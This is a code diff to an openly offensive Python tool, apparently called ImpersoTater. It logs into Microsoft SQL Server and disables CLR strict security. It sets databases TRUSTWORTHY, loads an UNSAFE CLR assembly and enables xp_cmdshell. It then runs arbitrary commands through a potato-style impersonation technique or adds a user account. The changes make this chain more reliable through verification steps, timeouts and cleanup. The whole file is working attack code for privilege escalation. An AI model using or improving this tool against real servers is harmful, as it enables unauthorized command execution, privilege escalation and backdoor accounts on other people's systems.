@@ -12,27 +12,35 @@ Usage:
   ImpersoTater -t 10.0.0.5 -u sa -p Password1 --add-user
 """
 
-import argparse
 import os
+import sys
+
+_DIR = os.path.dirname(os.path.abspath(os.path.realpath(__file__)))
+
+# Auto-activate project venv when running under system Python
+_VENV = os.path.join(_DIR, '.venv')
+_VENV_PYTHON = os.path.join(_VENV, 'bin', 'python3')
+if (os.path.isdir(_VENV)
+        and os.path.isfile(_VENV_PYTHON)
+        and not sys.prefix.startswith(os.path.realpath(_VENV))):
+    try:
+        os.execv(_VENV_PYTHON, [_VENV_PYTHON] + sys.argv)
+    except OSError:
+        pass
+
+import argparse
+import io
 import re
 import shutil
 import subprocess
-import sys
-import io
-
-
-_DIR = os.path.dirname(os.path.abspath(__file__))
-
-
-def _read_cs(name):
-    with open(os.path.join(_DIR, name)) as f:
-        return f.read()
+import tempfile
 
 
 def mssql_connect(host, port, username, password, domain, windows_auth):
     from impacket import tds
     sql = tds.MSSQL(host, int(port))
     sql.connect()
+    sql.socket.settimeout(60)
     if windows_auth:
         ok = sql.login(None, username, password, domain, None, True)
     else:
@@ -44,21 +52,25 @@ def mssql_connect(host, port, username, password, domain, windows_auth):
 
 
 def sql_exec_raw(sql, query):
-    sql.sql_query(query)
+    """Execute SQL and return text output. Raises ConnectionError on socket/protocol failure."""
+    try:
+        sql.sql_query(query)
+    except Exception as e:
+        raise ConnectionError(f'SQL connection lost: {e}') from e
     old = sys.stdout
     sys.stdout = buf = io.StringIO()
     try:
         sql.printRows()
     except Exception:
         pass
-    sys.stdout = old
+    finally:
+        sys.stdout = old
     return buf.getvalue().strip()
 
 
 def compile_dll():
     cs_core = os.path.join(_DIR, 'ImpersoTater.cs')
     cs_sql = os.path.join(_DIR, 'ImpersoTater_sql.cs')
-    dll_path = os.path.join(_DIR, 'ImpersoTater.dll')
 
     if not os.path.isfile(cs_core) or not os.path.isfile(cs_sql):
         print('[!] C# source files not found', file=sys.stderr)
@@ -68,17 +80,25 @@ def compile_dll():
         print('[!] mcs (Mono C# compiler) not found. Run: ./install.sh', file=sys.stderr)
         sys.exit(1)
 
+    fd, dll_path = tempfile.mkstemp(suffix='.dll', prefix='impersotater_')
+    os.close(fd)
+
     cmd = ['mcs', '-target:library', '-out:' + dll_path,
            '-r:System.Data', cs_core, cs_sql]
     r = subprocess.run(cmd, capture_output=True, text=True)
     if r.returncode != 0:
+        try:
+            os.remove(dll_path)
+        except OSError:
+            pass
         print(f'[!] Compilation failed:\n{r.stderr}', file=sys.stderr)
         sys.exit(1)
     print(f'[+] Compiled CLR assembly ({os.path.getsize(dll_path)} bytes)')
     return dll_path
 
 
-def deploy_clr(sql, dll_path, cmd, technique):
+def deploy_clr(sql, dll_path, cmd, technique, strict_was_on):
+    """Deploy and execute CLR assembly. Returns result string or None on failure."""
     with open(dll_path, 'rb') as f:
         dll_bytes = f.read()
     hex_str = '0x' + dll_bytes.hex().upper()
@@ -90,16 +110,13 @@ def deploy_clr(sql, dll_path, cmd, technique):
         print('[*] Enabling CLR...')
         sql_exec_raw(sql, "EXEC sp_configure 'clr enabled', 1; RECONFIGURE;")
 
-    out = sql_exec_raw(sql, "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'clr strict security'")
-    strict_was_on = '1' in out
-
     if strict_was_on:
         print('[*] Temporarily disabling CLR strict security...')
         sql_exec_raw(sql, "EXEC sp_configure 'clr strict security', 0; RECONFIGURE;")
 
     out = sql_exec_raw(sql, "SELECT name FROM sys.assemblies WHERE name = 'ImpersoTaterAsm'")
     if 'ImpersoTaterAsm' in out:
-        print('[*] Dropping existing assembly...')
+        print('[*] Dropping stale assembly from previous run...')
         sql_exec_raw(sql, "IF OBJECT_ID('dbo.ImpersoTaterExec') IS NOT NULL DROP PROCEDURE dbo.ImpersoTaterExec;")
         sql_exec_raw(sql, "DROP ASSEMBLY ImpersoTaterAsm;")
 
@@ -111,11 +128,12 @@ def deploy_clr(sql, dll_path, cmd, technique):
             sql_exec_raw(sql, f"ALTER DATABASE [{db}] SET TRUSTWORTHY ON;")
 
     print(f'[*] Deploying CLR assembly ({len(dll_bytes)} bytes)...')
-    out = sql_exec_raw(sql, f"CREATE ASSEMBLY ImpersoTaterAsm FROM {hex_str} WITH PERMISSION_SET = UNSAFE;")
-    if 'error' in out.lower() or 'fail' in out.lower():
-        print(f'[!] Assembly creation failed: {out}', file=sys.stderr)
-        if strict_was_on:
-            sql_exec_raw(sql, "EXEC sp_configure 'clr strict security', 1; RECONFIGURE;")
+    sql.socket.settimeout(120)
+    sql_exec_raw(sql, f"CREATE ASSEMBLY ImpersoTaterAsm FROM {hex_str} WITH PERMISSION_SET = UNSAFE;")
+
+    verify = sql_exec_raw(sql, "SELECT name FROM sys.assemblies WHERE name = 'ImpersoTaterAsm'")
+    if 'ImpersoTaterAsm' not in verify:
+        print('[!] Assembly deployment failed — not found after CREATE ASSEMBLY', file=sys.stderr)
         return None
 
     print('[*] Creating stored procedure...')
@@ -124,9 +142,15 @@ def deploy_clr(sql, dll_path, cmd, technique):
         AS EXTERNAL NAME ImpersoTaterAsm.[PotatoProc].ExecWith;
     """)
 
+    verify = sql_exec_raw(sql, "SELECT OBJECT_ID('dbo.ImpersoTaterExec')")
+    verify_clean = verify.strip().replace('-', '').replace('\n', '').strip()
+    if not verify_clean or verify_clean == 'NULL':
+        print('[!] Stored procedure creation failed', file=sys.stderr)
+        return None
+
     print(f'[*] Executing: {cmd}')
     print(f'[*] Technique: {technique}')
-    sql.socket.settimeout(120)
+    sql.socket.settimeout(180)
     escaped = cmd.replace(chr(39), chr(39)+chr(39))
     result = sql_exec_raw(sql, f"EXEC dbo.ImpersoTaterExec @cmd = N'{escaped}', @technique = N'{technique}';")
 
@@ -135,22 +159,42 @@ def deploy_clr(sql, dll_path, cmd, technique):
 
 
 def cleanup_clr(sql, restore_strict, restore_xpc=False):
+    """Clean up deployed assembly and restore settings. Resilient to partial failures."""
     print('\n[*] Cleaning up...')
-    sql_exec_raw(sql, "IF OBJECT_ID('dbo.ImpersoTaterExec') IS NOT NULL DROP PROCEDURE dbo.ImpersoTaterExec;")
+    errors = []
 
-    out = sql_exec_raw(sql, "SELECT name FROM sys.assemblies WHERE name = 'ImpersoTaterAsm'")
-    if 'ImpersoTaterAsm' in out:
-        sql_exec_raw(sql, "DROP ASSEMBLY ImpersoTaterAsm;")
+    try:
+        sql_exec_raw(sql, "IF OBJECT_ID('dbo.ImpersoTaterExec') IS NOT NULL DROP PROCEDURE dbo.ImpersoTaterExec;")
+    except Exception as e:
+        errors.append(f'DROP PROCEDURE: {e}')
+
+    try:
+        out = sql_exec_raw(sql, "SELECT name FROM sys.assemblies WHERE name = 'ImpersoTaterAsm'")
+        if 'ImpersoTaterAsm' in out:
+            sql_exec_raw(sql, "DROP ASSEMBLY ImpersoTaterAsm;")
+    except Exception as e:
+        errors.append(f'DROP ASSEMBLY: {e}')
 
     if restore_strict:
-        print('[*] Restoring CLR strict security...')
-        sql_exec_raw(sql, "EXEC sp_configure 'clr strict security', 1; RECONFIGURE;")
+        try:
+            print('[*] Restoring CLR strict security...')
+            sql_exec_raw(sql, "EXEC sp_configure 'clr strict security', 1; RECONFIGURE;")
+        except Exception as e:
+            errors.append(f'CLR strict security: {e}')
 
     if restore_xpc:
-        print('[*] Restoring xp_cmdshell...')
-        sql_exec_raw(sql, "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;")
+        try:
+            print('[*] Restoring xp_cmdshell...')
+            sql_exec_raw(sql, "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;")
+        except Exception as e:
+            errors.append(f'xp_cmdshell: {e}')
 
-    print('[+] Cleanup complete')
+    if errors:
+        print('[!] Cleanup had errors:', file=sys.stderr)
+        for err in errors:
+            print(f'    {err}', file=sys.stderr)
+    else:
+        print('[+] Cleanup complete')
 
 
 def _ensure_xp_cmdshell(sql):
@@ -159,6 +203,10 @@ def _ensure_xp_cmdshell(sql):
         return False
     sql_exec_raw(sql, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
     sql_exec_raw(sql, "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
+    out = sql_exec_raw(sql, "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'xp_cmdshell'")
+    if '1' not in out:
+        print('[!] Failed to enable xp_cmdshell', file=sys.stderr)
+        sys.exit(1)
     return True
 
 
@@ -284,6 +332,14 @@ def apply_target(args):
             args.target = ts
 
 
+def _print_manual_cleanup():
+    print('[!] Manual cleanup may be needed on the target:', file=sys.stderr)
+    print('    DROP PROCEDURE dbo.ImpersoTaterExec;', file=sys.stderr)
+    print('    DROP ASSEMBLY ImpersoTaterAsm;', file=sys.stderr)
+    print("    EXEC sp_configure 'clr strict security', 1; RECONFIGURE;", file=sys.stderr)
+    print("    EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;", file=sys.stderr)
+
+
 def main():
     args = parse_args()
     apply_target(args)
@@ -299,30 +355,60 @@ def main():
                         args.domain, windows_auth)
     print(f'[+] Connected')
 
-    info = enumerate_target(sql)
-
-    if args.add_user is not None:
-        cmd = build_add_user_cmd(args.add_user)
-    else:
-        cmd = args.command
-
-    print('\n[*] Deploying CLR assembly...')
-    dll_path = compile_dll()
-
-    out = sql_exec_raw(sql, "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'clr strict security'")
-    strict_was_on = '1' in out
-
-    result = deploy_clr(sql, dll_path, cmd, args.technique)
-
-    if not args.no_cleanup:
-        cleanup_clr(sql, strict_was_on, info.get('xpc_was_off', False))
+    dll_path = None
+    strict_was_on = False
+    xpc_was_off = False
+    needs_cleanup = False
 
     try:
-        os.remove(dll_path)
-    except OSError:
-        pass
+        info = enumerate_target(sql)
+        xpc_was_off = info.get('xpc_was_off', False)
 
-    sql.disconnect()
+        if args.add_user is not None:
+            cmd = build_add_user_cmd(args.add_user)
+        else:
+            cmd = args.command
+
+        print('\n[*] Deploying CLR assembly...')
+        dll_path = compile_dll()
+
+        out = sql_exec_raw(sql, "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'clr strict security'")
+        strict_was_on = '1' in out
+
+        needs_cleanup = True
+        result = deploy_clr(sql, dll_path, cmd, args.technique, strict_was_on)
+
+        if not args.no_cleanup:
+            cleanup_clr(sql, strict_was_on, xpc_was_off)
+            needs_cleanup = False
+
+    except KeyboardInterrupt:
+        print('\n[!] Interrupted', file=sys.stderr)
+    except ConnectionError as e:
+        print(f'\n[!] Connection lost: {e}', file=sys.stderr)
+        if needs_cleanup:
+            _print_manual_cleanup()
+        needs_cleanup = False
+    except Exception as e:
+        print(f'\n[!] Error: {e}', file=sys.stderr)
+    finally:
+        if needs_cleanup:
+            try:
+                cleanup_clr(sql, strict_was_on, xpc_was_off)
+            except Exception:
+                _print_manual_cleanup()
+
+        if dll_path:
+            try:
+                os.remove(dll_path)
+            except OSError:
+                pass
+
+        try:
+            sql.disconnect()
+        except Exception:
+            pass
+
     print('\n[*] Done')
 
 
